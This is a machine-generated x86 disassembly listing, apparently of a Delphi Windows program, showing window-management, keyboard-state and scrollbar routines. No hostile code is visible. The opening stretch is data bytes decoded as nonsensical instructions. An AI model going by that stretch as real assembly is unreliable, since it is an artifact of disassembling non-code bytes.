add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
pop edi
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
dec edi
pushad
or al 0x45
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
pushfd
push cs
inc ebp
add al al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
jb r-xdata
pop esp
jb r-xdata
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
and al 0xb2
inc esi
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xf06f666e
pop edi
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
jo r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x45
add [ eax ] cl
add [ eax ] al
add [ esi ] 0xc
dec edi
or al 0x45
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
arpl [ ebx + 0x4f ] bp
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x10 ] bp
push cs
inc ebp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc esp
jae r-xdata
add [ eax ] al
add [ ebp ] 0x9
dec edi
pop edi
inc ecx
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
or [ ebp ] eax
cwde
or al [ ebp ]
loopne r-xdata
outsb
dec eax
imul esp [ ebp - 0x5c ] 0xa80046b2
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
or eax [ ebp ]
call 0xffffffffe945c0a9
add [ eax ] al
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0x44ff0002 ]
sti
inc esi
jo r-xdata
add bh bh
inc esp
sti
inc esi
cmovne eax [ eax ]
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
inc esp
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
add [ esi ] al
dec edi
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push cs
pop edi
inc ecx
add al dl
add al [ eax ]
call eax
outsd
jne r-xdata
push ebp
jo r-xdata
add [ edi ] al
dec edi
push edi
push 0x246c6565
adc [ ebp ] al
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
insb
and al 0x10
inc ebp
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
inc esp
outsd
ja r-xdata
push 0xc00046b2
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
and al 0x10
inc ebp
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
jo r-xdata
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
inc esp
sti
inc esi
pop edi
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xdc4776f
inc ebp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
push edi
call 0xffffffffd8470717
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
les eax [ esi ]
sbb al 0xc5
inc esi
add al bh
add al [ eax ]
add [ eax ] al
mov bl 0x46
add [ edx + ebx + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
inc [ ebx + edi * 8 + 0x46 ]
inc ebp
add al ah
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0053 ] al
jb r-xdata
inc esi
jb r-xdata
outsb
dec ebp
push cs
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
pop edi
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
je r-xdata
jpe r-xdata
leave
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
mov esp 0x280046ec
rol [ ebp ] 0xd8
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add [ eax + 0x40046ed ] dh
jge r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ eax + 0x8 ] ah
inc edi
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esp + 0x46 ] bl
outsb
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
add [ esi + ecx * 8 + 0x45 ] dl
add ah cl
jmp 0xffffffff941ec440
add [ eax - 0x1e ] al
inc esi
add ah dh
jecxz r-xdata
inc esp
in al 0xc4
inc esi
add [ eax * 8 + 0x2f80046 ] bl
add [ eax ] al
add [ ebx + 0x1a5c0046 ] dh
inc edx
outsd
arpl [ ebx + 0x58 ] bp
or eax 0x1f00045
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl al 0xc3
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
lds eax [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
mov al [ 0xffffffff80004705 ]
cwde
inc ebp
add [ eax + ebx * 4 + 0x81c0045 ] al
inc edi
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 + 0xf100045 ] dl
inc edi
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0x24240045
inc edi
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
add al 0x15
inc edi
add [ eax - 0x1b ] al
inc esi
add [ ebp + 0x28040046 ] bh
inc edi
add [ eax - 0x1e ] bh
inc esi
add [ eax ] cl
and eax [ edi ]
call 0xffffffffbc470be6
and al 0x47
add [ eax + 0x90046ef ] ah
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax + ebx * 2 ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x5bffbaa7 ] ch
out dx eax
inc esi
add [ eax - 0x12 ] dh
inc esi
add al ah
pop edx
inc ebp
add [ eax + esi * 8 ] bl
inc esi
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ eax ] al
jmp eax
dec esp
or al [ ebp ]
call 0xffffffffe945c1cb
add [ eax ] eax
inc [ ebx + edi * 8 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070051 ] al
sub_46c7a4
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_46c7f0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_475f0c
mov eax [ rw-data ]
call sub_42158c
mov eax [ rw-data ]
call sub_421534
retn
push 0x0
push eax
call ShowOwnedPopups
sub_46c828
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_46c878
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_46c91b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46c8e4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_46c828
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c922
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_46c92c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_40278c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_46c964
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_46c9c8
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_46c964
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_46ca24
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_46ca44
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_46ca24
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_46ca70
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_4734ec
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_47395c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f68
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4734d8
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_473948
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f68
test eax eax
je r-xdata
sub_46cb0c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_46cb60
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_46cb9c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_46cbe8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46cc46
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46a788
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404164
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f68
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc4d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
sub_46cc58
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_46cc80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_46ccf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_46cc58
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ccf8
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
sub_46cd00
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_46cd90
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_46d658
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_46d638
mov edx [ edi + 0xc ]
mov eax ebx
call sub_46d4e8
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46cde0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46cf98
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4560c0
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_46d4e8
xor edx edx
mov eax ebx
call sub_46d4e8
jmp r-xdata
sub_46ce18
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42c268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_46ce84
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42c268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_46ceec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_46d620
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_459078
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_46d620
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_45903c
call sub_46ce84
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_45903c
call sub_46ce18
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_46cf98
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46cfd0
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_46d004
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_46cfd0
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_46cfd0
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_46d080
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_46d004
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_455450
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_46d004
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_455494
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46d118
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_46d178
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_46d349 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46d080
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46d080
mov edx eax
